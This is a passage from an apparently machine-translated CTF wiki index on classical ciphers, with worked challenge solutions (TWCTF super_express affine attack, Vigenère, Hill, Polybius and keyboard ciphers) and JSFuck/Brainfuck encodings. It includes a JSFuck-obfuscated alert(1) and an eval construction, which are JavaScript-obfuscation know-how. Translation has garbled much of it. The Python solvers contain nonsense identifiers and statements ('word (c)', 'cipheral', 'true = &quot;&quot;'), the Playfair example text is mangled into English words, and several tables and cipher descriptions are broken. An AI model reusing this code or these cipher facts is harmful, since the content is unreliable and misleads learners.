b.</p>"},{"location":"crypto/classical/monoalphabetic/#examples","title":"Examples","text":"<p>Here we take TWCTF 2016's super_express as an example. Simply look at the source code</p> <pre><code>import sys\n\nkey = '****CENSORED***************'\n\nflag = 'TWCTF{*******CENSORED********}'\n\n\n\nif len(key) % 2 == 1:\n\n    print(\"Key Length Error\")\n\n    sys.exit(1)\n\n\n\nn = len (key) / 2\nencrypted = ''\n\nfor c in flag:\n\nc = word (c)\n    for a, b in zip(key[0:n], key[n:2*n]):\n\nc = (ord (a) * c + ord (b))% 251\n    encrypted += '%02x' % c\n\n\n\nprint encrypted\n</code></pre> <p>It can be found that although each letter in the flag is encrypted n times, if we analyze it carefully, we can find</p> <p>$$</p> <p>\\begin{align*}</p> <p>c_1&amp;=a_1c+b_1 \\</p> <p>c_2 &amp; = a_2c_1 + b_2 \\    &amp;=a_1a_2c+a_2b_1+b_2 \\</p> <p>&amp; = kc + d \\end{align*}  </p> <p>$$</p> <p>According to the second line of derivation, we can get the actual form of $c_n $, which can be seen as $c_n=xc+y $ , and we can know that the key is always unchanged, so that In fact, this is the affine password.</p> <p>In addition, the title also gives the plaintext and part of the partial ciphertext corresponding plaintext, then we can easily use the known plaintext attack method to attack, using the code as follows</p> <pre><code>import gmpy\n\n\n\nkey = '****CENSORED****************'\n\nflag = 'TWCTF{*******CENSORED********}'\n\n\n\nf = open('encrypted', 'r')\n\ndata = f.read().strip('\\n')\n\nencrypted = [int(data[i:i + 2], 16) for i in range(0, len(data), 2)]\n\nplaindelta = words (flag [1]) - words (flag [0])\ncipherdalte = encrypted[1] - encrypted[0]\n\na = gmpy.invert (plaindelta, 251) * cipheral% 251\nb = (encrypted[0] - a * ord(flag[0])) % 251\n\na_inv = gmpy.invert(a, 251)\n\nresult = \"\"\n\nfor c in encrypted:\n\n    result += chr((c - b) * a_inv % 251)\n\nprint result\n</code></pre> <p>Results are as follows</p> <pre><code>\u279c  TWCTF2016-super_express git:(master) \u2717 python exploit.py\nTWCTF{Faster_Than_Shinkansen!}\n</code></pre>"},{"location":"crypto/classical/others/","title":"Other Types of Cipher","text":""},{"location":"crypto/classical/others/#bacon-password","title":"Bacon Password","text":""},{"location":"crypto/classical/others/#principle","title":"Principle","text":"<p>The Bacon password uses two different fonts, representing A and B, combined with an encryption table for encryption and decryption.</p> a AAAAA g AABBA n ABBAA t BAABA <p>| b AAAAB | h. | AABBB | o | ABBAB | uv | BAABB | | c | AAABA | ij | ABAAA | p | ABBBA | w | BABAA | | d | AAABB | k | ABAAB | q | ABBBB | x | BABAB | | e | AABAA | l | ABABA | r | BAAAA | y | BABBA | | f AABAB m ABABB | s BAAAB z BABBB</p> <p>The above is a commonly used encryption table. There is another type of encryption table that can be thought of as sorting 26 letters from 0 to 25, expressed in binary, with A representing 0 and B representing 1.</p> <p>The following paragraph is the encrypted content of plain text steganography, the normal font is A, and the bold is B:</p> <p>To encode a message each letter of the plaintext is replaced by a group of five of the letters 'A' or 'B'.</p> <p>It can be seen that the Bacon password mainly has the following characteristics.</p> <ul> <li>only two characters</li> <li>the length of each segment is 5</li> <li>Encrypted content will have a special font, or case.</li> </ul>"},{"location":"crypto/classical/others/#tools","title":"Tools","text":"<ul> <li>http://rumkin.com/tools/cipher/baconian.php</li> </ul>"},{"location":"crypto/classical/others/#fence-password","title":"fence password","text":""},{"location":"crypto/classical/others/#principle_1","title":"Principle","text":"<p>The fence password divides the plaintext to be encrypted into N groups, and then connects the first word of each group to form an irregular word. Here is an example</p> <pre><code>\u660e\u6587\uff1aTHERE IS A CIPHER\n</code></pre> <p>Changed after removing the space</p> <pre><code>THEREISACIPHER\n</code></pre> <p>Divided into two columns, two groups get</p> <pre><code>TH IS EI SA CI PH ER\n</code></pre> <p>First take the first letter and then take the second letter</p> <pre><code>TEESCPE\n\nHRIAIHR\n</code></pre> <p>Connected together</p> <pre><code>TEESCPEHRIAIHR\n</code></pre> <p>The above plain text can also be divided into 2 columns.</p> <pre><code>THEREIS ACIPHER\n</code></pre> <p>Combine to get ciphertext</p> <pre><code>TAHCEIRPEHIESR\n</code></pre>"},{"location":"crypto/classical/others/#tools_1","title":"Tools","text":"<p>To be added.</p>"},{"location":"crypto/classical/others/#_1","title":"\u66f2\u8def\u5bc6\u7801","text":""},{"location":"crypto/classical/others/#principle_2","title":"Principle","text":"<p>Curve Cipher is a transposition password that requires the two parties to agree on the key (that is, the path of the curve). An example is given below</p> <pre><code>\u660e\u6587\uff1aThe quick brown fox jumps over the lazy dog\n</code></pre> <p>Fill in 5 rows and 7 lists (pre-agreed the number of rows and columns filled)</p> <p></p> <p>Encrypted loop line (pre-agreed the number of rows and columns filled)</p> <p></p> <pre><code>\u5bc6 \u6587: gesfc inpho dtmwu qoury zejre hbxva lookT\n</code></pre>"},{"location":"crypto/classical/others/#column-shift-encryption","title":"Column Shift Encryption","text":""},{"location":"crypto/classical/others/#principle_3","title":"Principle","text":"<p>Column Transposition Cipher is a relatively simple and easy-to-implement transposition cipher that mixes plaintext into ciphertext through a simple rule. An example is given below.</p> <p>We use the clear text <code>The quick brown fox jumps over the lazy dog</code>, the key <code>how are u</code> as an example:</p> <p>Fill in the clear line with 5 rows and 7 lists (pre-agreed the number of rows and columns to be filled in. If the plain text cannot be filled in, the form can be filled with a letter)</p> <p></p> <p>Key: <code>how are u</code>, press <code>how are u</code> to number in the order in which the alphabet appears. We have a for 1, e for 2, h for 3, o for 4, and r for 5. u is 6, and w is 7, so write a column first, followed by column e, and so on. The result is cipher text:</p> <p></p> <p>\u5bc6 \u6587: <code>qoury inpho takool hbxva uwmtd cfseg erjez</code></p>"},{"location":"crypto/classical/others/#tools_2","title":"Tools","text":"<ul> <li>http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/ The number of rows and columns is equal</li> </ul>"},{"location":"crypto/classical/others/#01248-password","title":"01248 Password","text":""},{"location":"crypto/classical/others/#principle_4","title":"Principle","text":"<p>This password, also known as cloud shadow password, uses 0, 1, 2, 4, 8 four digits, where 0 is used to indicate the interval, and other numbers can be expressed by addition: 28=10,124=7,18=9 Then use 1-&gt;26 to indicate A-&gt;Z.</p> <p>It can be seen that the password has the following characteristics</p> <ul> <li>only 0, 1, 2, 4, 8</li> </ul>"},{"location":"crypto/classical/others/#examples","title":"Examples","text":"<p>Here we take CFF 2016 shadow password as an example, the topic</p> <p>8842101220480224404014224202480122</p> <p>We divide by 0, as follows</p> Content Numbers Characters <p>| 88421 | 8 + 8 + 4 + 2 + 1 = 23 W | | 122 | 1 + 2 + 2 = 5 | E | | 48 | 4 + 8 = 12 | L | | 2244 | 2 + 2 + 4 + 4 = 12 | L | | 4      | 4              | D    |</p> <p>| 142242 | 1 + 4 + 2 + 2 + 4 + 2 = 15 | O | | 248    | 2+4+8=14       | N    |</p> <p>| 122 | 1 + 2 + 2 = 5 | E |</p> <p>So the final flag is WELLDONE.</p>"},{"location":"crypto/classical/others/#jsfuck","title":"JSFuck","text":""},{"location":"crypto/classical/others/#principle_5","title":"Principle","text":"<p>JSFuck can write JavaScript programs with only 6 characters <code>[]()!+</code>. For example, we want to use JSFuck to implement the <code>alert(1)</code> code as follows</p> <pre><code>[][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]][([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+([][[]]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[+!+[]]]]+([][[]]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]((![]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+[+!+[]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]])()\n</code></pre> <p>Some other basic expressions:</p> <pre><code>false       =&gt;  ![]\n\ntrue        =&gt;  !![]\n\nundefined   =&gt;  [][[]]\n\nNaN =&amp;gt; + [! []]\n0           =&gt;  +[]\n\n1           =&gt;  +!+[]\n\n2           =&gt;  !+[]+!+[]\n\n10          =&gt;  [+!+[]]+[+[]]\n\nArray       =&gt;  []\n\nNumber      =&gt;  +[]\n\nString      =&gt;  []+[]\n\nBoolean     =&gt;  ![]\n\nFunction    =&gt;  [][\"filter\"]\n\neval        =&gt;  [][\"filter\"][\"constructor\"]( CODE )()\n\nwindow      =&gt;  [][\"filter\"][\"constructor\"](\"return this\")()\n</code></pre>"},{"location":"crypto/classical/others/#tools_3","title":"Tools","text":"<ul> <li>[JSFuck Online Encryption Website] (http://www.jsfuck.com/)</li> </ul>"},{"location":"crypto/classical/others/#brainfuck","title":"BrainFuck","text":""},{"location":"crypto/classical/others/#principle_6","title":"Principle","text":"<p>Brainfuck, a minimal computer language, was created in 1993 by Urban M\u00fcller. Let's take an example if we want to print Hello World on the screen! , then the corresponding program is as follows. For the principles, you can search online for your own interest.</p> <pre><code>++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]\n\n&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.\n\n&gt;.+++.------.--------.&gt;+.&gt;.\n</code></pre> <p>Corresponding to it is ook.</p>"},{"location":"crypto/classical/others/#tools_4","title":"Tools","text":"<ul> <li>https://www.splitbrain.org/services/ook</li> </ul>"},{"location":"crypto/classical/others/#pigsty-password","title":"Pigsty password","text":""},{"location":"crypto/classical/others/#principle_7","title":"Principle","text":"<p>The pigsty password is a simple alternative password based on the grid. The grid is as follows</p> <p>![Pig password comparison table] (./figure/pigpen.png)</p> <p>Let's take an example, such as the plain text is <code>X marks the spot</code>, then the ciphertext is as follows</p> <p>![pig password example] (./figure/pigpen_example.png)</p>"},{"location":"crypto/classical/others/#tools_5","title":"Tools","text":"<ul> <li>http://www.simonsingh.net/The_Black_Chamber/pigpen.html</li> </ul>"},{"location":"crypto/classical/others/#dancing-villain-password","title":"Dancing villain password","text":""},{"location":"crypto/classical/others/#principle_8","title":"Principle","text":"<p>This password comes from the Sherlock Holmes collection. Each dancing villain actually corresponds to one of the twenty-six letters in English, while the flag in the hand of the villain indicates that the letter is the last letter of the word, if it is just a word instead of a sentence, or a sentence The last word in the word, the last letter in the word does not have to be raised.</p> <p>![Dancing Man's Password] (./figure/dancingman.jpg)</p>"},{"location":"crypto/classical/others/#keyboard-password","title":"Keyboard password","text":"<p>The so-called keyboard password is encrypted using a mobile phone keyboard or a computer keyboard.</p>"},{"location":"crypto/classical/others/#mobile-keyboard-password","title":"Mobile keyboard password","text":"<p>The phone keyboard encryption method is that there are 3-4 letters on each number key, and the two-digit number is used to represent the letter. For example: ru is represented by the phone keypad: 7382, then you can know here, the phone keyboard encryption method is impossible. Start with 1, the second digit cannot exceed 4, refer to this when decrypting</p> <p></p> <p>Another way to encrypt your phone's keyboard is the \"sound\" style (this may vary depending on the phone). Refer to the phone keypad for details. For example, \"Number\" means: 748 94. Pressing these numbers on the phone keypad will bring out the pinyin of \"number\".</p>"},{"location":"crypto/classical/others/#computer-keyboard-board","title":"Computer keyboard board","text":"<p>The computer keyboard is encrypted and uses the square of the computer's board.</p> <p></p>"},{"location":"crypto/classical/others/#computer-keyboard-coordinates","title":"Computer keyboard coordinates","text":"<p>Encryption of the computer keyboard coordinates, using the letter lines and numbers on the keyboard to encrypt, for example: bye using the computer keyboard XY means: 351613</p> <p>![Computer keyboard coordinate encryption] (./figure/computer-xy.jpg)</p>"},{"location":"crypto/classical/others/#computer-keyboard-qwe","title":"Computer keyboard QWE","text":"<p>Computer keyboard QWE encryption method is to replace the order of the keyboard with the alphabet.</p> <p></p>"},{"location":"crypto/classical/others/#keyboard-layout-encryption","title":"Keyboard layout encryption","text":"<p>Simply put, it is encrypted according to how the given character looks on the keyboard.</p>"},{"location":"crypto/classical/others/#0ctf-2014-classic","title":"0CTF 2014 classic","text":"<p>&gt; Xiaoding Ding found himself in a strange room with only a door with strange characters in front of him. He found a password lock on the side of the door, which seemed to require a password to open the door. . 4esxcft5 rdcvgt 6tfc78uhg 098ukmnb</p> <p>Found so chaotic, but also including the number and letter guess may be the keyboard password, try to draw in the alphabetical order on the keyboard, you can get 0ops, guess is the flag.</p>"},{"location":"crypto/classical/others/#2017-xman-trials-one-two-three-wood-people","title":"2017 xman trials - one two three, wood people","text":"<p>&gt; I count 123 wood people, and I will be deducted if I don't act.</p> <p>23731263111628163518122316391715262121</p> <p>&gt; password format xman{flag}</p> <p>There are obvious hints 123 in the title, then it is natural to think of the computer keyboard coordinate password in the keyboard password. You can find that the second digits of the first few digits are in the range of 1-3, which also verifies our guess. then</p> <p>23-x</p> <p>73-m</p> <p>12-a</p> <p>63-n</p> <p>11-q</p> <p>No, the password format is <code>xman{</code>, the fourth character is <code>{</code>, so I look at the position of <code>{</code>, which does not have a corresponding abscissa, but if we manually treat it as 11, then 111 is <code>{</code>. Then push back in turn and find that it is feasible. Finally, treat 121 as <code>}</code> to get the flag.</p> <pre><code>xman{hintisenough}\n</code></pre> <p>From here we can see that we still have to pay attention to mobility, and we cannot simply copy some existing knowledge.</p>"},{"location":"crypto/classical/others/#title","title":"Title","text":"<ul> <li>Experiment with strange text messages</li> </ul>"},{"location":"crypto/classical/polyalphabetic/","title":"Multi-table Substitution Cipher","text":"<p>For multi-table replacement encryption, the encrypted letters almost no longer maintain the original frequency, so we can only use the algorithm to achieve the corresponding weakness to crack.</p>"},{"location":"crypto/classical/polyalphabetic/#playfair","title":"Playfair","text":""},{"location":"crypto/classical/polyalphabetic/#principle","title":"Principle","text":"<p>The Playfair cipher or Playfair square is a replacement password, invented by the British Charles Wheatstone in 1854. The basic algorithm is as follows:</p> <ol> <li>Select a string of English letters, remove the repeated letters, and add the remaining letters one by one to the 5 \u00d7 5 matrix. The remaining space is added by the unjoined English letters in the order of az. Note that q is removed, or i and j are treated as the same word.</li> <li>Divide the plaintext to be encrypted into two groups. If the letters in the group are the same, add X (or Q) to the first letter of the group and regroup. If there is one word left, also add X.</li> <li>In each group, find out where the two letters are in the matrix.</li> <li>If the two letters have different rows and different columns, find the other two letters in the matrix (the first letter corresponds to the row first), so that the four letters become the four corners of a rectangle.</li> <li>If the two letters are accompanied, take the letters to the right of the two letters (if the letter is at the far right, take the leftmost letter).</li> <li>If the two letters are in the same column, take the letters below the two letters (if the letter is at the bottom, take the top letter).</li> </ol> <p>The two newly found letters are the result of the original two-letter encryption.</p> <p>Use playfair example as the key, get</p> <pre><code>P L A Y F\n\niREX\nB C D G H\n\nK N O Q S\n\nT U V W Z\n</code></pre> <p>The message to be encrypted is Hide the gold in the tree stump</p> <pre><code>THAT IS TH EG OL DI NT HE TR EX IS YOUR MP\n</code></pre> <p>Will get</p> <pre><code>BM OD ZB XD WILL BE DM UI XM FOR UV IF\n</code></pre>"},{"location":"crypto/classical/polyalphabetic/#tools","title":"Tools","text":"<ul> <li>CAP4</li> </ul>"},{"location":"crypto/classical/polyalphabetic/#polybius","title":", Polybius","text":""},{"location":"crypto/classical/polyalphabetic/#principle_1","title":"Principle","text":"<p>Polybius passwords are also known as board passwords, which are generally used to encrypt a given plaintext into a pair of numbers.</p> <p>|      | 1   | 2   | 3   | 4   | 5    |</p> <p>| :--- | --- | --- | --- | --- | :--- |</p> <p>| 1    | A   | B   | C   | D   | E    |</p> <p>| 2    | F   | G   | H   | I/J | K    |</p> <p>| 3    | L   | M   | N   | O   | P    |</p> <p>| 4    | Q   | R   | S   | T   | U    |</p> <p>| 5 V W | X Y | Z |</p> <p>For example, plain text HELLO, encrypted is 23 15 31 31 34.</p> <p>Another password table</p> <p>|     | A   | D   | F   | G   | X   |</p> <p>| --- | --- | --- | --- | --- | --- |</p> <p>| A   | b   | t   | a   | l   | p   |</p> <p>| D   | d   | h   | o   | z   | k   |</p> <p>| F   | q   | f   | v   | s   | n   |</p> <p>| G   | g   | j   | c   | u   | x   |</p> <p>| X   | m   | r   | e   | w   | y   |</p> <p>Note that the order of the letters here is upset.</p> <p>The origin of ADFGX:</p> <p>&gt; In 1918, when the First World War was about to end, the French army intercepted a German telegram. All the words in the message were composed of five letters A, D, F, G, and X, hence the name ADFGX. . The ADFGX password was invented by German Colonel Fritz Nebel in March 1918 and is a dual encryption scheme that combines Polybius passwords and replacement passwords.</p> <p>For example, HELLO, using this form of encryption, is DD XF AG AG DF.</p>"},{"location":"crypto/classical/polyalphabetic/#tools_1","title":"Tools","text":"<ul> <li>CrypTool</li> </ul>"},{"location":"crypto/classical/polyalphabetic/#examples","title":"Examples","text":"<p>Here is an example of the An Heng Cup September Crypto competition Go. The title is:</p> <p>&gt; \u5bc6 \u6587 \uff1a</p> <p>&gt; The zip package gives a line of hex: 546865206c656e677468206f66207468697320706c61696e746578743a203130</p> <p>&gt; Please decrypt the ciphertext</p> <p>First, hexadecimal hexadecimal decoding, get the string: \"The length of this plaintext: 10\"</p> <p>The length of the ciphertext is 20, and the length of the plaintext is 10. The ciphertext has only five characters: \"l\", \"i\", \"n\", \"k\", \"e\", which is associated with the chessboard password.</p> <p>First try the five characters in alphabetical order:</p> e i k l n <p>| e    | A   | B   | C   | D   | E    |</p> <p>| i    | F   | G   | H   | I/J | K    |</p> <p>| k    | L   | M   | N   | O   | P    |</p> <p>| l    | Q   | R   | S   | T   | U    |</p> <p>| n    | V   | W   | X   | Y   | Z    |</p> <p>Decrypted according to ciphertext: iytghpkqmq.</p> <p>This should not be the flag answer we want.</p> <p>It seems that the five-character arrangement is not arranged in this way. There are a total of 5!</p> <pre><code>import itertools\n\n\n\nkey = []\n\ncipher = \"ilnllliiikkninlekile\"\n\n\n\nfor i in itertools.permutations('ilnke', 5):\n\n    key.append(''.join(i))\n\n\n\nfor now_key in key:\n\n    solve_c = \"\"\n\ntrue = &amp;quot;&amp;quot;\n    for now_c in cipher:\n\n        solve_c += str(now_key.index(now_c))\n\n    for i in range(0,len(solve_c),2):\n\n        now_ascii = int(solve_c[i])*5+int(solve_c[i+1])+97\n        if now_ascii&gt;ord('i'):\n\n            now_ascii+=1\n\n        res += chr(now_ascii)\n\n    if \"flag\" in res:\n\n        print now_key,res\n</code></pre> <p>The script is actually the algorithm for implementing the checkerboard password, but the order of the five characters is not fixed.</p> <p>Run the following two results:</p> <p>&gt; linke flagishere</p> <p>&gt; lines flagkxhdwd</p> <p>Obviously the first one is the answer we want.</p> <p>Attach the correct password form:</p> l i n k e <p>| l    | A   | B   | C   | D   | E    |</p> <p>| i    | F   | G   | H   | I/J | K    |</p> <p>| n    | L   | M   | N   | O   | P    |</p> <p>| k    | Q   | R   | S   | T   | U    |</p> <p>| e | V W | X Y | Z |</p>"},{"location":"crypto/classical/polyalphabetic/#vigenere-virginia-password","title":"Vigenere Virginia Password","text":""},{"location":"crypto/classical/polyalphabetic/#principle_2","title":"Principle","text":"<p>The Virginia code (Vigenere) is an encryption algorithm that uses a series of Caesar ciphers to form a cipher alphabet, a simple form of multi-table ciphers.</p> <p>![Virginia Form] (./figure/vigenere1.jpg)</p> <p>An example is given below</p> <pre><code>Clear text: come greatwall\nKey: crypto\n</code></pre> <p>First, the key is padded to the same length as the plaintext.</p> \u660e\u6587 c o m e g r e a t w a l l <p>| \u5bc6\u94a5 | c   | r   | y   | p   | t   | o   | c   | r   | y   | p   | t   | o   | c   |</p> <p>Second, check the ciphertext</p> <p>![Virginia Encryption] (./figure/vigenere2.jpg)</p> <pre><code>Clear text: come greatwall\nKey: crypto\nCiphertext: efkt zferrltzn\n</code></pre>"},{"location":"crypto/classical/polyalphabetic/#_1","title":"\u7834","text":"<p>The deciphering of all multi-table ciphers, including the Virginia code, is based on the frequency of letters, but direct frequency analysis does not apply because in the Virginia code, a letter can be Encrypted into different ciphertexts, so simple frequency analysis is not useful here.</p> <p>** The key to deciphering a Virginia password is that its key is cyclically repeated. ** If we know the length of the key, the ciphertext can be seen as an interlaced Caesar cipher, and each of them can be cracked separately. Regarding the length of the password, we can use the Kasiki test and the Friedman test to get it.</p> <p>The Kasiki test is based on the fact that common words like the one may be encrypted by the same key letter and thus repeated in the ciphertext. For example, different CRYPTOs in plaintext may be encrypted into different ciphertexts by the key ABCDEF:</p> <pre><code>Key: ABCDEF AB CDEFA BCD EFABCDEFABCD\n\u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY\n\n\u5bc6\u6587\uff1aCSASXT IT UKSWT GQU GWYQVRKWAQJB\n</code></pre> <p>The elements repeated in the plaintext at this time are not repeated in the ciphertext. However, if the keys are the same, the result might be (using the key ABCD):</p> <pre><code>\u5bc6\u94a5 \uff1a ABCDAB CD ABCDA BCD ABCDABCDABCD\n\u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY\n\n\u5bc6 \u6587: CSASTP KV SIQUT GQU CSASTPIUAQJB\n</code></pre> <p>At this point, the Kasiki test can produce results. This method is more efficient for longer paragraphs because there are usually more repeating fragments in the ciphertext. The length of the key can be deciphered by the following ciphertext:</p> <pre><code>\u5bc6\u6587\uff1aDYDUXRMHTVDVNQDQNWDYDUXRMHARTJGWNQD\n</code></pre> <p>Among them, the appearance of two DYDUXRMH is separated by 18 letters. Therefore, it can be assumed that the length of the key is a divisor of 18, that is, the length is 18, 9, 6, 3 or 2. The two NQDs are 20 letters apart, meaning the key length should be 20, 10, 5, 4 or 2. Taking the intersection of the two, the key length can be basically determined to be 2. The next step is to proceed further.</p> <p>For more detailed cracking principles, I will not do too much introduction here. See http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/.</p>"},{"location":"crypto/classical/polyalphabetic/#tools_2","title":"Tools","text":"<ul> <li>Known key</li> <li>Python's pycipher library</li> <li> <p>[Online decryption Vigen\u00e8re cipher] (http://planetcalc.com/2468/)</p> <ul> <li>CAP4</li> </ul> </li> <li> <p>Unknown key</p> <ul> <li>Vigen\u00e8re Cipher Codebreaker</li> </ul> </li> <li> <p>[Vigenere Solver] (https://www.guballa.de/vigenere-solver) is not perfect.</p> </li> </ul>"},{"location":"crypto/classical/polyalphabetic/#nihilist","title":"Nihilist","text":""},{"location":"crypto/classical/polyalphabetic/#principle_3","title":"Principle","text":"<p>The Nihilist password is also known as the keyword password: plain text + keyword = cipher text. Take the keyword helloworld as an example.</p> <p>First construct a checkerboard matrix using a key (similar to a Polybius password) - Create a new 5 \u00d7 5 matrix - Fill characters into the matrix without repeating them in order - The rest is filled in alphabetical order - the letters i and j are equivalent</p> <p>|     | 1   | 2   | 3     | 4   | 5   |</p> <p>| --- | --- | --- | ----- | --- | --- |</p> <p>| 1 | h | e | l | of | w | | 2   | r   | d   | a     | b   | c   |</p> <p>| 3   | f   | g   | i / j | k   | m   |</p> <p>| 4   | n   | p   | q     | s   | t   |</p> <p>| 5   | u   | v   | x     | y   | z   |</p> <p>Encrypt the encryption process reference matrix M:</p> <pre><code>a -&gt; M[2,3] -&gt; 23\n\nt -&gt; M[4,5] -&gt; 45\n</code></pre> <p>For the decryption process</p> <p>Decrypt with reference matrix M:</p> <pre><code>23 -&gt; M[2,3] -&gt; a\n\n45 -&gt; M[4,5] -&gt; t\n</code></pre> <p>It can be seen that the characteristics of ciphertext have the following points</p> <ul> <li>pure numbers</li> <li>only 1 to 5</li> <li>Even ciphertext length.</li> </ul>"},{"location":"crypto/classical/polyalphabetic/#hill","title":"Hill","text":""},{"location":"crypto/classical/polyalphabetic/#principle_4","title":"Principle","text":"<p>Hill (Hill) uses the order of each letter in the alphabet as its corresponding number, ie A=0, B=1, C=2, etc., and then converts the plaintext into an n-dimensional vector, followed by an n \u00d7 n The matrix is multiplied and the resulting result is modulo 26. Note that the matrix used for encryption (ie, the key) must be reversible at \\mathbb{Z}_{26}^{n}, otherwise it is impossible to decode. Only the determinant of the matrix and the 26 prime are reversible. Here is an example</p> <pre><code>Clear text: ACT\n</code></pre> <p>Ming culture is a matrix.</p> <p>$$</p> <p>\\begin{bmatrix}</p> <p>0\\</p> <p>2\\</p> <p>19</p> <p>\\end{bmatrix}</p> <p>$$</p> <p>Suppose the key is:</p> <p>$$</p> <p>\\begin{bmatrix}</p> <p>6 &amp; 24 &amp; 1\\</p> <p>13 &amp; 16 &amp; 10\\</p> <p>20 &amp; 17 &amp; 15</p> <p>\\end{bmatrix}</p> <p>$$</p> <p>The encryption process is:</p> <p>$$</p> <p>\\begin{bmatrix}</p> <p>6 &amp; 24 &amp; 1\\</p> <p>13 &amp; 16 &amp; 10\\</p> <p>20 &amp; 17 &amp; 15</p> <p>\\end{bmatrix}</p> <p>\\begin{bmatrix}</p> <p>0\\</p> <p>2\\</p> <p>19</p> <p>\\end{bmatrix}</p> <p>\\equiv</p> <p>\\begin{bmatrix}</p> <p>67\\</p> <p>222\\</p> <p>319</p> <p>\\end{bmatrix}</p> <p>\\equiv</p> <p>\\begin{bmatrix}</p> <p>15\\</p> <p>14\\</p> <p>7</p> <p>\\end{bmatrix}</p> <p> Way 26 $$</p> <p>Ciphertext is</p> <pre><code>Ciphertext: POH\n</code></pre>"},{"location":"crypto/classical/polyalphabetic/#tools_3","title":"Tools","text":"<ul> <li> <p>http://www.practicalcryptography.com/ciphers/hill-cipher/</p> </li> <li> <p>CAP4</p> </li> <li> <p>Cryptool</p> </li> </ul>"},{"location":"crypto/classical/polyalphabetic/#examples_1","title":"Examples","text":"<p>Here we take ISCC 2015 base decrypt 150 as an example, the title is</p> <p>&gt; ciphertext: 22,09,00,12,03,01,10,03,04,08,01,17 (wjamdbkdeibr)</p> <p>&gt; The matrix used is 1 2 3 4 5 6 7 8 10</p> <p>&gt; Please decrypt the ciphertext.</p> <p>First, the matrix is 3 \u00d7 3 . Description Encrypts 3 characters each time. We use Cryptool directly. It should be noted that this matrix is arranged in columns. That is as follows</p> <pre><code>1 4 7\n\n2 5 8\n\n3 6 10\n</code></pre> <p>The final result is <code>overthehillx</code>.</p>"},{"location":"crypto/classical/polyalphabetic/#autokeycipher","title":"AutokeyCipher","text":""},{"location":"crypto/classical/polyalphabetic/#principle_5","title":"Principle","text":"<p>Autokey Cipher is also a multi-table replacement password, similar to a Virginia password, but uses a different method to generate a key. It is generally safer than a Virginia password. There are two main types of automatic key passwords: keyword automatic key password and original automatic key password. Let's take the keyword automatic key as an example:</p> <pre><code>\u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\n\nKeywords: CULTURE\n</code></pre> <p>Automatically generate a key:</p> <pre><code>CULTURE THE QUICK BROWN FOX JUMPS OVER THE\n</code></pre> <p>The next encryption process is similar to the Virginia password, available from the corresponding table:</p> <p>Ciphertext</p> <pre><code>VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK\n</code></pre>"},{"location":"crypto/classical/polyalphabetic/#tools_4","title":"Tools","text":"<ul> <li>Known keywords</li> <li>Python's pycipher library</li> <li> <p>Unknown keywords</p> <ul> <li>http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/</li> </ul> </li> <li> <p>break_autokey.py under the **tools folder, to be completed. **</p> </li> </ul>"},{"location":"crypto/classical/summary/","title":"to sum up","text":""},{"location":"crypto/classical/summary/#classical-password-analysis","title":"Classical Password Analysis","text":"<p>The questions about classical ciphers in CTF are usually based on ciphertext to obtain plaintext. Therefore, ** ciphertext attack ** is mostly used. The basic analysis ideas are summarized as follows:</p> 